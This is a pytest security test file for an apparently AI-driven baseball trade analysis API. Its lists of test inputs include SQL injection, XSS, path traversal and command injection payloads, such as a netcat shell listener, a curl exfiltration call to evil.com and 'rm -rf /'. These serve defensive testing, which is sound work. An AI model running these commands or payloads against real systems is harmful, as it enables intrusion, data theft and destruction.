"""
Comprehensive security tests for Baseball Trade AI
Tests authentication, authorization, input validation, and security headers
"""

import pytest
import asyncio
import json
import time
from unittest.mock import patch, Mock, AsyncMock
from fastapi.testclient import TestClient
from httpx import AsyncClient
from datetime import datetime, timedelta
from typing import Dict, List, Any

from backend.api.trade_analyzer_v2 import app
from backend.services.supabase_service import supabase_service


class TestInputValidationSecurity:
    """Test input validation and sanitization security"""
    
    def test_sql_injection_protection(self, test_client, mock_supabase_service):
        """Test SQL injection attack prevention"""
        sql_injection_payloads = [
            "'; DROP TABLE teams; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM teams --",
            "'; INSERT INTO teams VALUES ('hack', 'Hackers'); --",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "1' AND 1=1 UNION SELECT 1,username,password FROM users--",
            "1' AND '1'='1",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            # Test team parameter
            response = test_client.post("/api/analyze-trade", json={
                "team": payload,
                "request": "Need a pitcher"
            })
            # Should be rejected by validation or return 404 for invalid team
            assert response.status_code in [422, 404], f"SQL injection not blocked: {payload}"
            
            # Test request parameter
            response = test_client.post("/api/analyze-trade", json={
                "team": "yankees",
                "request": payload
            })
            # Should be processed safely or rejected if too dangerous
            assert response.status_code in [200, 422], f"SQL injection in request not handled: {payload}"
    
    def test_xss_prevention(self, test_client, mock_supabase_service):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert(document.cookie)</script>",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<body onload=alert('XSS')>",
            "<<SCRIPT>alert(\"XSS\")<</SCRIPT>",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>"
        ]
        
        for payload in xss_payloads:
            response = test_client.post("/api/analyze-trade", json={
                "team": "yankees",
                "request": payload
            })
            
            # Check response doesn't contain unescaped payload
            if response.status_code == 200:
                response_text = response.text
                # Payload should be sanitized/escaped
                assert payload not in response_text, f"XSS payload not sanitized: {payload}"
            else:
                # Should be rejected due to validation
                assert response.status_code == 422
    
    def test_path_traversal_protection(self, test_client):
        """Test path traversal attack prevention"""
        path_traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../var/log/auth.log",
            "....//....//....//etc//passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\/..\/..\/etc\/passwd",
        ]
        
        for payload in path_traversal_payloads:
            # Test in URL path
            response = test_client.get(f"/api/analysis/{payload}")
            assert response.status_code in [404, 422], f"Path traversal not blocked: {payload}"
            
            # Test in request body
            response = test_client.post("/api/analyze-trade", json={
                "team": payload,
                "request": "Need a pitcher"
            })
            assert response.status_code in [422, 404], f"Path traversal in body not blocked: {payload}"
    
    def test_command_injection_protection(self, test_client, mock_supabase_service):
        """Test command injection prevention"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(uname -a)",
            "; rm -rf /",
            "| nc -l -p 1234 -e /bin/sh",
            "&& curl http://evil.com/steal?data=",
            "; python -c \"import os; os.system('id')\"",
            "| python -m http.server 8080"
        ]
        
        for payload in command_injection_payloads:
            response = test_client.post("/api/analyze-trade", json={
                "team": "yankees",
                "request": f"Need a pitcher {payload}"
            })
            
            # Should either be processed safely or rejected
            assert response.status_code in [200, 422], f"Command injection not handled: {payload}"
            
            if response.status_code == 200:
                # Verify no command execution occurred by checking response
                response_data = response.json()
                assert "analysis_id" in response_data, "Response malformed after command injection attempt"
    
    def test_oversized_input_protection(self, test_client, mock_supabase_service):
        """Test protection against oversized inputs"""
        # Test very large request
        large_request = "A" * 50000  # 50KB request
        response = test_client.post("/api/analyze-trade", json={
            "team": "yankees",
            "request": large_request
        })
        
        # Should be rejected due to size limit
        assert response.status_code == 422
        
        # Test extremely large JSON
        huge_json = {"team": "yankees", "request": "A" * 1000000}  # 1MB
        response = test_client.post("/api/analyze-trade", json=huge_json)
        
        # Should be rejected at HTTP level or validation level
        assert response.status_code in [413, 422]
    
    def test_null_byte_injection(self, test_client, mock_supabase_service):
        """Test null byte injection prevention"""
        null_byte_payloads = [
            "valid\x00malicious",
            "yankees\x00.txt",
            "request\x00<?php echo 'test'; ?>",
            "\x00\x01\x02\x03",
        ]
        
        for payload in null_byte_payloads:
            response = test_client.post("/api/analyze-trade", json={
                "team": "yankees",
                "request": payload
            })
            
            # Should be handled safely
            if response.status_code == 200:
                response_data = response.json()
                # Verify null bytes don't break the response
                assert "analysis_id" in response_data
            else:
                assert response.status_code == 422
    
    def test_unicode_normalization_attacks(self, test_client, mock_supabase_service):
        """Test Unicode normalization attack prevention"""
        unicode_payloads = [
            "admin\u202e",  # Right-to-left override
            "test\u2028\u2029",  # Line/paragraph separators
            "\ufeff",  # Byte order mark
            "\u0000",  # Null character
            "テスト",  # Japanese characters
            "🔥💯🚀",  # Emojis
        ]
        
        for payload in unicode_payloads:
            response = test_client.post("/api/analyze-trade", json={
                "team": "yankees", 
                "request": f"Need pitcher {payload}"
            })
            
            # Should handle Unicode safely
            assert response.status_code in [200, 422]


class TestAuthenticationSecurity:
    """Test authentication and session security"""
    
    def test_missing_authentication_headers(self, test_client):
        """Test behavior with missing authentication headers"""
        # Most endpoints should work without auth (public API)
        response = test_client.get("/")
        assert response.status_code == 200
        
        response = test_client.get("/api/teams")
        assert response.status_code == 200
        
        # But sensitive operations might require auth in future
        response = test_client.post("/api/analyze-trade", json={
            "team": "yankees",
            "request": "Need pitcher"
        })
        # Currently public, but test structure is ready for auth requirements
        assert response.status_code in [200, 401]
    
    def test_invalid_jwt_tokens(self, test_client):
        """Test handling of invalid JWT tokens"""
        invalid_tokens = [
            "invalid.jwt.token",
            "Bearer invalid",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "null",
            "undefined",
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = test_client.post("/api/analyze-trade", 
                json={"team": "yankees", "request": "Need pitcher"},
                headers=headers
            )
            
            # Should either ignore invalid auth or reject it
            assert response.status_code in [200, 401, 403]
    
    def test_token_expiry_handling(self, test_client):
        """Test expired token handling"""
        expired_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxfQ.invalid"
        
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = test_client.post("/api/analyze-trade",
            json={"team": "yankees", "request": "Need pitcher"},
            headers=headers
        )
        
        # Should handle expired tokens gracefully
        assert response.status_code in [200, 401]


class TestRateLimitingSecurity:
    """Test rate limiting and DoS protection"""
    
    def test_request_rate_limiting(self, test_client, mock_supabase_service):
        """Test basic rate limiting functionality"""
        # Make multiple requests rapidly
        responses = []
        for i in range(20):  # Make 20 rapid requests
            response = test_client.post("/api/analyze-trade", json={
                "team": "yankees",
                "request": f"Need pitcher {i}"
            })
            responses.append(response)
            time.sleep(0.1)  # Small delay between requests
        
        # Check if any were rate limited
        status_codes = [r.status_code for r in responses]
        
        # Should have some successful requests and possibly some rate limited
        assert 200 in status_codes or 503 in status_codes
        
        # If rate limiting is implemented, we should see 429 responses
        if 429 in status_codes:
            rate_limited_responses = [r for r in responses if r.status_code == 429]
            assert len(rate_limited_responses) > 0
    
    def test_concurrent_request_handling(self, test_client, mock_supabase_service):
        """Test handling of concurrent requests"""
        import concurrent.futures
        import threading
        
        def make_request(request_id):
            return test_client.post("/api/analyze-trade", json={
                "team": "yankees",
                "request": f"Concurrent request {request_id}"
            })
        
        # Make 10 concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request, i) for i in range(10)]
            responses = [future.result() for future in futures]
        
        # All requests should either succeed or fail gracefully
        for response in responses:
            assert response.status_code in [200, 429, 503]
        
        # At least some should succeed
        successful = [r for r in responses if r.status_code == 200]
        assert len(successful) > 0


class TestSecurityHeaders:
    """Test security headers and CORS configuration"""
    
    def test_security_headers_present(self, test_client):
        """Test that proper security headers are set"""
        response = test_client.get("/")
        
        # Check for security headers (if implemented)
        headers = response.headers
        
        # Test CORS headers
        response = test_client.options("/api/analyze-trade")
        
        # Should have CORS headers
        if 'access-control-allow-origin' in response.headers:
            # If CORS is enabled, check it's configured properly
            cors_origin = response.headers.get('access-control-allow-origin')
            # In production, this should not be '*'
            assert cors_origin is not None
    
    def test_cors_configuration(self, test_client):
        """Test CORS configuration security"""
        # Test preflight request
        response = test_client.options("/api/analyze-trade", headers={
            "Origin": "http://malicious-site.com",
            "Access-Control-Request-Method": "POST"
        })
        
        # Should handle CORS appropriately
        assert response.status_code in [200, 204, 405]
        
        # Test actual CORS request
        response = test_client.post("/api/analyze-trade",
            json={"team": "yankees", "request": "test"},
            headers={"Origin": "http://localhost:3000"}
        )
        
        # Should work from allowed origins
        assert response.status_code in [200, 403]


class TestErrorHandlingSecurity:
    """Test security aspects of error handling"""
    
    def test_error_information_disclosure(self, test_client):
        """Test that errors don't leak sensitive information"""
        # Force various error conditions
        test_cases = [
            {"url": "/api/analysis/invalid-id", "method": "GET"},
            {"url": "/api/analyze-trade", "method": "POST", "json": {}},
            {"url": "/nonexistent-endpoint", "method": "GET"},
        ]
        
        for case in test_cases:
            if case["method"] == "GET":
                response = test_client.get(case["url"])
            else:
                response = test_client.post(case["url"], json=case.get("json", {}))
            
            # Error responses should not leak internal information
            if response.status_code >= 400:
                error_text = response.text.lower()
                
                # Should not contain sensitive paths or internal details
                sensitive_patterns = [
                    "traceback",
                    "/home/",
                    "/usr/",
                    "/var/",
                    "exception:",
                    "stack trace",
                    "internal server error",
                    "database error",
                    "connection string",
                    "password",
                    "secret",
                    "key"
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in error_text, f"Sensitive info leaked in error: {pattern}"
    
    def test_exception_handling_security(self, test_client):
        """Test that exceptions are handled securely"""
        # Test malformed JSON
        response = test_client.post("/api/analyze-trade", 
            data="invalid json",
            headers={"Content-Type": "application/json"}
        )
        
        assert response.status_code == 422
        error_data = response.json()
        
        # Error should be informative but not expose internals
        assert "error" in error_data or "detail" in error_data


class TestDatabaseSecurity:
    """Test database security aspects"""
    
    @pytest.mark.asyncio
    async def test_database_connection_security(self, mock_supabase_service):
        """Test database connection security"""
        # Test that database errors don't expose connection details
        mock_supabase_service.get_all_teams.side_effect = Exception("Connection failed")
        
        with patch('backend.services.supabase_service.supabase_service', mock_supabase_service):
            # Should handle database errors gracefully
            teams = await mock_supabase_service.get_all_teams()
            # Error should be caught and handled appropriately
    
    def test_sql_parameter_binding(self, test_client, mock_supabase_service):
        """Test that SQL parameters are properly bound"""
        # Test with potentially dangerous input
        dangerous_input = "'; DROP TABLE teams; SELECT * FROM teams WHERE '1'='1"
        
        response = test_client.post("/api/analyze-trade", json={
            "team": "yankees",
            "request": dangerous_input
        })
        
        # Should be handled safely by parameter binding
        assert response.status_code in [200, 422]


class TestBusinessLogicSecurity:
    """Test security of business logic"""
    
    def test_trade_request_validation(self, test_client, mock_supabase_service):
        """Test trade request validation security"""
        # Test various invalid inputs
        invalid_requests = [
            {"team": "", "request": ""},  # Empty values
            {"team": "yankees", "request": ""},  # Empty request
            {"team": "", "request": "valid request"},  # Empty team
            {"team": "invalid_team", "request": "valid request"},  # Invalid team
            {"team": "yankees", "request": "a"},  # Too short
        ]
        
        for invalid_request in invalid_requests:
            response = test_client.post("/api/analyze-trade", json=invalid_request)
            # Should be rejected by validation
            assert response.status_code in [422, 404]
    
    def test_resource_limits(self, test_client, mock_supabase_service):
        """Test resource consumption limits"""
        # Test with complex request that might consume resources
        complex_request = {
            "team": "yankees",
            "request": "Need a starting pitcher with ERA under 3.00, at least 200 innings pitched, under 30 years old, with postseason experience, who can also play outfield occasionally, has leadership qualities, fits our budget of exactly $15.7 million, available immediately, from a team willing to trade within the division, preferably left-handed, with a fastball over 95 mph, and a changeup that drops at least 8 mph from fastball velocity",
            "urgency": "high",
            "budget_limit": 50000000,
            "include_prospects": True,
            "max_trade_partners": 5
        }
        
        response = test_client.post("/api/analyze-trade", json=complex_request)
        
        # Should either process or reject based on complexity limits
        assert response.status_code in [200, 422, 429]


@pytest.mark.security
class TestSecurityIntegration:
    """Integration security tests"""
    
    def test_end_to_end_security(self, test_client, mock_supabase_service, mock_front_office_crew):
        """Test security through complete request flow"""
        # Test a complete secure request
        secure_request = {
            "team": "yankees",
            "request": "Need a reliable starting pitcher for playoff contention"
        }
        
        response = test_client.post("/api/analyze-trade", json=secure_request)
        
        if response.status_code == 200:
            data = response.json()
            
            # Verify response structure
            assert "analysis_id" in data
            assert "status" in data
            assert "team" in data
            
            # Verify no sensitive data leakage
            response_str = json.dumps(data)
            sensitive_patterns = ["password", "secret", "key", "token", "internal"]
            
            for pattern in sensitive_patterns:
                assert pattern.lower() not in response_str.lower()
    
    def test_security_with_real_workflow(self, test_client, mock_supabase_service, mock_front_office_crew):
        """Test security in realistic usage patterns"""
        # Simulate real user workflow
        
        # 1. Get teams list
        teams_response = test_client.get("/api/teams")
        assert teams_response.status_code == 200
        
        # 2. Submit analysis
        analysis_response = test_client.post("/api/analyze-trade", json={
            "team": "yankees",
            "request": "Need closer for bullpen depth"
        })
        
        if analysis_response.status_code == 200:
            analysis_data = analysis_response.json()
            analysis_id = analysis_data["analysis_id"]
            
            # 3. Check status
            status_response = test_client.get(f"/api/analysis/{analysis_id}")
            assert status_response.status_code in [200, 404]
            
            # 4. Verify no security issues in complete flow
            all_responses = [teams_response, analysis_response, status_response]
            
            for response in all_responses:
                if response.status_code == 200:
                    # Verify response doesn't contain dangerous content
                    response_text = response.text.lower()
                    dangerous_patterns = ["<script>", "javascript:", "onclick=", "onerror="]
                    
                    for pattern in dangerous_patterns:
                        assert pattern not in response_text